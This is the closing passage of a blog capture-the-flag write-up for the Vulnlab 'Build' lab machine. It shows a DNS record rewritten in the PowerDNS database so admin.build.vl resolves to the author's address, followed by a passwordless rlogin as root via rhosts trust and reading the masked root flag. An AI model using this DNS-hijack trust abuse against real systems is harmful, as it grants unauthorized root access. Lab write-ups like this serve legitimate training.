class="operator">|</span>  <span class="number">8</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> db.build.vl          <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.4</span>                                                                               <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">9</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> gitea.build.vl       <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.2</span>                                                                               <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> intern.build.vl      <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span>                                                                               <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> jenkins.build.vl     <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.3</span>                                                                               <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> pdns<span class="operator">-</span>worker.build.vl <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.5</span>                                                                               <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">13</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> pdns.build.vl        <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.6</span>                                                                               <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">14</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> build.vl             <span class="operator">|</span> SOA  <span class="operator">|</span> a.misconfigured.dns.server.invalid hostmaster.build.vl <span class="number">2024050201</span> <span class="number">10800</span> <span class="number">3600</span> <span class="number">604800</span> <span class="number">3600</span> <span class="operator">|</span> <span class="number">1500</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">15</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> admin.build.vl       <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">10.8</span><span class="number">.5</span><span class="number">.50</span>                                                                                <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span></span><br><span class="line"><span class="number">8</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.278</span> sec)</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~$ nslookup admin.build.vl 10.10.107.157</span><br><span class="line">Server:         10.10.107.157</span><br><span class="line">Address:        10.10.107.157#53</span><br><span class="line"></span><br><span class="line">Name:   admin.build.vl</span><br><span class="line">Address: 10.8.5.50</span><br></pre></td></tr></table></figure></div>
+
+<p>with that, I can login as root</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~$ rlogin 10.10.107.157 -l root</span><br><span class="line">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">  System information as of Tue Jan 21 09:10:04 AM UTC 2025</span><br><span class="line"></span><br><span class="line">  System load:                      0.05029296875</span><br><span class="line">  Usage of /:                       62.7% of 9.75GB</span><br><span class="line">  Memory usage:                     58%</span><br><span class="line">  Swap usage:                       0%</span><br><span class="line">  Processes:                        143</span><br><span class="line">  Users logged <span class="keyword">in</span>:                  0</span><br><span class="line">  IPv4 address <span class="keyword">for</span> br-f8002c9d7234: 172.18.0.1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> ens5:            10.10.107.157</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Expanded Security Maintenance <span class="keyword">for</span> Applications is not enabled.</span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line">Enable ESM Apps to receive additional future security updates.</span><br><span class="line">See https://ubuntu.com/esm or run: <span class="built_in">sudo</span> pro status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check <span class="keyword">for</span> new updates run: <span class="built_in">sudo</span> apt update</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">root@build:~# <span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">root@build:~# <span class="built_in">ls</span></span><br><span class="line">root.txt  scripts  snap</span><br><span class="line">root@build:~# <span class="built_in">cat</span> root.txt</span><br><span class="line">VL&#123;**********&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/vulnlab-build/build-pwn.png"
+                      alt="pwn"
+                ></p>
+
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Linux/">#Linux</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Vulnlab/">#Vulnlab</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Easy/">#Easy</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/01/21/Vulnlab/Vulnlab-Baby/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Vulnlab-Baby</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/01/19/Hackthebox/htb-monitorsthree/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HTB-MonitorsThree</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">Vulnlab-Build</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#User"><span class="nav-text">User</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration"><span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Gitea-Jenkins"><span class="nav-text">Gitea &amp; Jenkins</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Rsync"><span class="nav-text">Rsync</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cracking-jenkins"><span class="nav-text">Cracking jenkins</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Logging-into-Gitea"><span class="nav-text">Logging into Gitea</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Getting-rev-shells"><span class="nav-text">Getting rev shells</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#User-in-DOCKER"><span class="nav-text">User in DOCKER</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-text">Privilege Escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Rhosts"><span class="nav-text">Rhosts</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Docker%E2%80%99s-IP"><span class="nav-text">Docker’s IP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reverse-Proxy-via-Chisel"><span class="nav-text">Reverse Proxy via Chisel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MariaDB-enumeration"><span class="nav-text">MariaDB enumeration</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Root"><span class="nav-text">Root</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Muyi</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        37 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog "></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
